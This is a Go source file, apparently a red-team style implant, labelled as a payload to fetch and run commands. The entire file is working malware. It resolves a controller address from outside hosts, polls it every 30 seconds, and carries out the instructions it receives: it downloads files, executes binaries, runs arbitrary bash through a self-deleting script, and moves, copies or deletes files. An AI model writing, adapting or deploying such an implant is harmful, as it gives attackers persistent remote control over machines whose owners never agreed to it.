// Michael Burke
//Payload to fetch and run commands
package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

//Initialize variables
var downDir string = "/tmp/"
var host string = "http://10.100.0.101/"
var edition int = 0
var isVerbose bool = false

func main() {
	//Check for arguments
	args := os.Args
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			switch args[i] {
			case "-v":
				isVerbose = true
			}
		}
	}
	do()
}

func do() {
	if isVerbose {
		fmt.Printf("Grabbing HTTP\n")
	}
	//Get and read stat file
	host = "http://" + GetIP() + "/"
	stat := getHTTP(host + "stat")
	commands := strings.Split(stat, "\n")

	//Edition tells us if there are new commands to execute
	if strings.Index(commands[0], "EDITION") == -1 {
		if isVerbose {
			fmt.Println("Edition doesn't exist")
		}
		repeat()
		return
	}
	newEdition, _ := strconv.Atoi(strings.Replace(commands[0], "EDITION ", "", 1))
	if newEdition <= edition {
		if isVerbose {
			fmt.Println("No new edition")
		}
		repeat()
		return
	}
	edition = newEdition

	//Read commands
	for i := 0; i < len(commands); i++ {
		command := commands[i]
		switch command {
		case "DOWNLOAD":
			downloadFile(downDir+commands[i+1], host+commands[i+1])
		case "EXECUTE":
			execute(commands[i+1])
		case "RUN":
			runCommand(commands[i+1])
		case "MOVE":
			moveFile(commands[i+1], commands[i+2])
		case "COPY":
			copyFile(commands[i+1], commands[i+2])
		case "DELETE":
			removeFile(commands[i+1])
		case "MESSAGE":
			runCommand("wall " + commands[i+1])
		case "SLEEP":
			sleepTime, _ := strconv.Atoi(commands[i+1])
			time.Sleep(time.Duration(sleepTime) * time.Second)
		}

	}
	fmt.Println("Commands executed")
	repeat()
}

func removeFile(path string) {
	os.Remove(path)
}

func GetIP() string {
	resp, err := http.Get("http://mdbook.me/ip-http.txt")
	var ip string
	if err == nil {
		body, _ := ioutil.ReadAll(resp.Body)
		line := string(body)
		line = strings.TrimSuffix(line, "\n")
		ip = line
	} else {
		resp, err = http.Get("http://129.21.141.218/ip-http.txt")
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			line := string(body)
			line = strings.TrimSuffix(line, "\n")
			ip = line
		} else {
			ip = "10.100.0.101"
		}
	}
	return ip
}

func copyFile(src, dest string) {
	_, err := os.Stat(src)
	if err != nil {
		return
	}
	source, err := os.Open(src)
	defer source.Close()

	destination, err := os.Create(dest)
	if err != nil {
		return
	}
	defer destination.Close()
	io.Copy(destination, source)
}

func moveFile(src, dest string) {
	os.Rename(src, dest)
}

func runCommand(command string) {
	//Create a bash script to run the command so I don't have to deal with exec.Command
	command = "#!/bin/bash\n" + command + "\nrm -f " + downDir + "executeme.sh"
	ioutil.WriteFile(downDir+"executeme.sh", []byte(command), 0777)
	cmd := exec.Command(downDir + "executeme.sh")
	cmd.Run()
}

func execute(command string) {
	cmd := exec.Command(command)
	cmd.Run()
}

func repeat() {
	//No random for this payload; check every 30 seconds
	delay := ( /*random(19) + */ 30)
	if isVerbose {
		fmt.Printf("Sleeping for %d Seconds\n", delay)
	}
	time.Sleep(time.Duration(delay) * time.Second)
	do()
}

func downloadFile(filepath string, url string) error {
	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func getHTTP(url string) string {
	//Basic HTTP GET requet
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}
